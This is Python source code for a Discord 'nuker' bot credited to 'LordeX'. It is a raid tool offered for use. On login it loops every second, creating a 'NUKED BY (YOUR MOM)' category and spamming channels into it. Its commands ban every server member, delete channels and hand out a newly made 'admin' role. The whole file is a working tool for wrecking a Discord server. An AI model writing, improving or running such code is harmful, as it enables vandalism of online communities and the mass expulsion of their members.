######################
#                    #
# Produced by LordeX #
#         .           #
######################
import discord
from discord.ext import commands, tasks
import asyncio

ascii_art = """
    ____  _                          __
   / __ \(_)_____________  _________/ /
  / / / / / ___/ ___/ __ \/ ___/ __  / 
 / /_/ / (__  ) /__/ /_/ / /  / /_/ /  
/_____/_/____/\___/\____/_/   \__,_/   
   / / / /__  (_)___ ___  ___  _____   
  / /_/ / _ \/ / __ `__ \/ _ \/ ___/   
 / __  /  __/ / / / / / /  __/ /       
/_/ /_/\___/_/_/ /_/ /_/\___/_/  
         
         [ArupinG Project]
            [By LordeX]
"""

# Token yazma yerinin üstüne ASCII sanatını ekleyerek rengini kırmızıya ayarla
print("\033[91m" + ascii_art + "\033[0m")

prefix = '!'
intents = discord.Intents.all()

bot = commands.Bot(command_prefix=prefix, intents=intents)

# List to store banned user IDs
banned_users = []

@bot.event
async def on_ready():
    print(f'{bot.user.name} has logged in!')
    create_category.start()
    create_channel_in_category.start()

@tasks.loop(seconds=1)
async def create_category():
    for guild in bot.guilds:
        category_name = "NUKED BY (YOUR MOM)"
        existing_category = discord.utils.get(guild.categories, name=category_name)

        if not existing_category:
            await guild.create_category(category_name)
            print(f"{category_name} category created!")

@tasks.loop(seconds=1)
async def create_channel_in_category():
    for guild in bot.guilds:
        category_name = "NUKED BY (YOUR MOM)"
        category = discord.utils.get(guild.categories, name=category_name)

        if category:
            channel_name = f"Your-Name-{create_channel_in_category.current_loop}"
            existing_channel = discord.utils.get(guild.channels, name=channel_name)

            if not existing_channel:
                await category.create_text_channel(channel_name)
                print(f"{channel_name} channel created!")

@bot.command(name='start')
async def start_nuke(ctx):
    create_category.start()
    create_channel_in_category.start()

@bot.command(name='stop')
async def stop_nuke(ctx):
    create_category.stop()
    create_channel_in_category.stop()

@bot.command(name='deletechannel')
async def nuke(ctx):
    await bot.wait_until_ready()
    for channel in ctx.guild.channels:
      # If you have changed the channel name to be created, write the channel name you changed below.
      if 'nuke' in channel.name:
            await channel.delete()

@bot.command(name='makeadmin')
async def make_admin(ctx, member: discord.Member):
    admin_role_name = "admin"

    # Create a role named "admin" first
    admin_role = await ctx.guild.create_role(name=admin_role_name)

    
    await member.add_roles(admin_role)

    await ctx.send(f"{admin_role_name} role given to {member.mention}!")

@bot.command(name='baneveryone')
async def ban_everyone(ctx):
    if ctx.author.guild_permissions.administrator:
        try:
            for member in ctx.guild.members:
                await member.ban()
            await ctx.send("Everyone has been banned from the server!")
        except discord.Forbidden:
            pass  
    else:
        await ctx.send("You do not have the permission to use this command!")

token = input("Enter your bot's token: ")
bot.run(token)
